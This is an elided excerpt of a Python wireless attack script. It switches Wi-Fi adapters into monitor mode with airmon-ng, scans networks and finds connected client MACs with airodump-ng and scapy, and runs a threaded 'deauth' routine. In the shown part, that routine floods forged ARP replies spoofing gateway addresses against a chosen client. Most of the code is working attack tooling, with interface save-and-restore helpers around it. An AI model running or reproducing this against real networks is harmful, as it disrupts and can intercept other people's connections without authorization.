...
attack_threads = []
original_interface_state = {}  # Store original interface state
...
def get_interface_state(interface: str) -> Dict[str, str]:
    """Get current state of an interface"""
    state = {"mode": "unknown", "channel": "unknown", "connected": "no"}
    ...
    try:
        ...
        if channel_match:
            state["channel"] = channel_match.group(1)
        
        # Check if connected
        if "ESSID" in output:
            essid_match = re.search(r'ESSID:"([^"]+)"', output)
            if essid_match and essid_match.group(1):
                state["connected"] = essid_match.group(1)
        
        # Get IP address
        try:
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                state["ip"] = addrs[netifaces.AF_INET][0]['addr']
        except:
            pass
            
    except Exception as e:
        print(f"Warning: Could not get state for {interface}: {e}")
    
    return state

def restore_interface_state(interface: str, original_state: Dict[str, str]):
    """Restore interface to its original state"""
    try:
        print(f"Restoring {interface} to original state...")
        ...
        # If it was in managed mode and connected to a network
        if original_state.get("mode") == "Managed" and original_state.get("connected") != "no":
            # Try to reconnect using NetworkManager
            try:
                subprocess.run(['nmcli', 'device', 'connect', interface], 
                             capture_output=True, timeout=10)
                print(f"Reconnecting {interface} to network...")
            except:
                # Manual method
        ...
        if original_state.get("channel") != "unknown":
            try:
                subprocess.run(['iwconfig', interface, 'channel', original_state["channel"]], 
                              capture_output=True, stderr=subprocess.DEVNULL)
            except:
                pass
...
def set_monitor_mode(interface: str) -> Tuple[Optional[str], Optional[Dict]]:
    """Set wireless interface to monitor mode and return the monitor interface name.
    Returns: (monitor_interface, original_state) or (None, None) on failure"""
    try:
        print(f"Setting {interface} to monitor mode...")
        
        # Save current state
        original_state = get_interface_state(interface)
        print(f"Original state: {original_state}")
        
        # Disconnect from network if connected
        if original_state.get("connected") != "no":
            print(f"Disconnecting {interface} from network...")
            try:
                ...
                # Manual disconnect
                subprocess.run(['iwconfig', interface, 'essid', 'off'], 
                             capture_output=True, stderr=subprocess.DEVNULL)
        ...
        # Try manual method first (less disruptive)
        try:
            print("Trying manual monitor mode setup...")
            ...
            if result.returncode == 0:
                ...
                raise Exception("Manual mode failed")
                
        except Exception as e:
            print(f"Manual mode failed: {e}, trying airmon-ng...")
            
            # Use airmon-ng as fallback
            try:
                # Kill only interfering processes for this interface
                result = subprocess.run(['airmon-ng', 'check', interface], 
                                      capture_output=True, text=True, timeout=10)
                
                # Start monitor mode
                result = subprocess.run(['airmon-ng', 'start', interface, '--kill'], 
                ...
                for line in result.stdout.split('\n'):
                    if 'monitor mode enabled on' in line.lower():
                        ...
                        if match:
                            ...
                            print(f"airmon-ng created monitor interface: {monitor_iface}")
                            break
                ...
                if not monitor_iface:
                    ...
                    for line in result.stdout.split('\n'):
                        if f'{interface}mon' in line or 'mon' in line:
                            match = re.search(r'^\d+: (\w+):', line)
                            if match and 'mon' in match.group(1):
                                monitor_iface = match.group(1)
                                break
                ...
                print(f"airmon-ng also failed: {e2}")
                return None, None
        ...
        if monitor_iface:
            ...
            if "Mode:Monitor" in result.stdout:
                print(f"Success: {monitor_iface} is in monitor mode")
                return monitor_iface, original_state
            else:
                print(f"Failed: {monitor_iface} not in monitor mode")
                # Try to restore
                restore_interface_state(interface, original_state)
                return None, None
    ...
    try:
        if interface_type == "wlan":
            ...
            if interface in result.stdout and "Mode:Monitor" in result.stdout:
                ...
                print(f"{interface} is not in monitor mode. Current mode: {result.stdout}")
                return False
...
def scan_networks_with_channel_hopping(interface: str, scan_time: int = 12) -> List[Dict]:
    """Scan for Wi-Fi networks with channel hopping for better results"""
    print(f"Scanning for Wi-Fi networks on {interface} with channel hopping...")
    
    networks = []
    seen_bssids = set()
    
    # Channels to scan (2.4 GHz and 5 GHz common channels)
    channels_2ghz = [1, 6, 11]  # Non-overlapping channels
        ...
        if pkt.haslayer(Dot11Beacon):
                ...
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 0:  # ESSID
                        try:
                            ...
                            if essid_bytes:
                                essid = essid_bytes.decode('utf-8', errors='ignore')
                            else:
                                essid = "<hidden>"
                        except:
                            essid = "<hidden>"
            ...
            if pkt.haslayer(RadioTap):
                ...
                if hasattr(radio, 'dBm_AntSignal'):
                    signal_strength = f"{radio.dBm_AntSignal} dBm"
    ...
    try:
        ...
        def sniff_thread():
            sniff(iface=interface, prn=packet_handler, stop_filter=lambda x: stop_sniff.is_set(), store=0)
        ...
        time_per_channel = max(1, scan_time // len(all_channels))
        ...
        print(f"Channel hopping scan error: {e}")
...
def scan_networks(interface: str) -> List[Dict]:
    ...
    if airodump_available:
        try:
            print("Using airodump-ng for scanning...")
            ...
            if os.path.exists(csv_file):
                ...
                for line in network_lines:
                    ...
                    if len(parts) >= 14:
                        ...
                        if bssid and bssid != "BSSID" and channel:
                            networks.append({
                                'BSSID': bssid,
                                'Channel': channel,
            ...
            print(f"\nairodump-ng scan failed: {e}")
            print("Falling back to channel hopping scan...")
            networks = scan_networks_with_channel_hopping(interface)
    else:
        print("airodump-ng not found, using channel hopping scan...")
        networks = scan_networks_with_channel_hopping(interface)
...
def select_network(interface: str, bssid: str, channel: str) -> List[Dict]:
    ...
    try:
        ...
        cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel,
               '--output-format', 'csv', '--write', temp_file, interface]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Let it scan for 8 seconds
        print("Scanning for clients (8 seconds)...")
        for i in range(8):
            if i % 2 == 0:
                print(".", end="", flush=True)
            time.sleep(1)
            ...
            for line in lines:
                ...
                if client_start and line.strip():
                    ...
                    if len(parts) >= 1:
                        ...
                        if client_mac and client_mac != 'BSSID' and len(client_mac) == 17:
                            clients.append({
                                'MAC': client_mac,
                                'BSSID': bssid,
                                'Interface': interface,
...
def deauth_client(interface: str, interface_type: str, bssid: str, 
    ...
    def deauth_thread():
        ...
        if interface_type == "wlan":
            ...
            try:
                # Get network information for better ARP spoofing
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    local_ip = addrs[netifaces.AF_INET][0]['addr']
                    network = '.'.join(local_ip.split('.')[:3]) + '.'
                    
                    # Create fake ARP responses for common gateway IPs
                    for i in range(1, 10):
                        if not running:
                            break
                        ...
                        arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                    ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                        psrc=client_mac, hwsrc=client_mac)
                        
                        sendp(arp_packet, iface=interface, count=1, verbose=0)
                        packets_sent += 1
                        time.sleep(0.5)
            ...
            try:
                ...
                if iface_type == "wlan":
                    ...
                    if essid_match:
                        ...
                        print(f"  Connected to: {essid if essid else 'Not connected'}")
...
def configure_interface(interface_type: str):
    ...
    global original_interface_state
    ...
    try:
        ...
        if 1 <= choice <= len(interfaces[interface_type]):
            ...
            if interface_type == "wlan":
                # Check current mode
                current_state = get_interface_state(selected_iface)
                print(f"\nCurrent state of {selected_iface}:")
                print(f"  Mode: {current_state.get('mode', 'Unknown')}")
                print(f"  Channel: {current_state.get('channel', 'Unknown')}")
                print(f"  Connected to: {current_state.get('connected', 'No')}")
                
                # Ask user what to do
                print("\nOptions:")
                print("1. Use current mode (if already in monitor mode)")
                ...
                if mode_choice == '1':
                    ...
                    if current_state.get('mode') == 'Monitor':
                        print(f"Using {selected_iface} in monitor mode")
                    ...
                    monitor_iface, original_state = set_monitor_mode(selected_iface)
                    if monitor_iface:
                        # Store original state for restoration
                        original_interface_state[monitor_iface] = {
                            'original_iface': selected_iface,
                            'original_state': original_state
                        }
                        print(f"Interface ready: {monitor_iface}")
                ...
                # Ethernet interface - just return it
...
def restore_interfaces():
    ...
    print("\nRestoring interfaces to original state...")
    
    for monitor_iface, info in original_interface_state.items():
        original_iface = info.get('original_iface', monitor_iface)
        original_state = info.get('original_state', {})
        
        print(f"Restoring {monitor_iface} to {original_iface}...")
        
        # First try to stop monitor mode
        try:
        ...
        restore_interface_state(original_iface, original_state)
    
    original_interface_state.clear()
    print("Interfaces restored.")
    ...
    try:
        while True:
            ...
            if choice == '1':
                ...
                restore_interfaces()
                print("Wi-Fi connection should be restored. You may need to reconnect manually.")
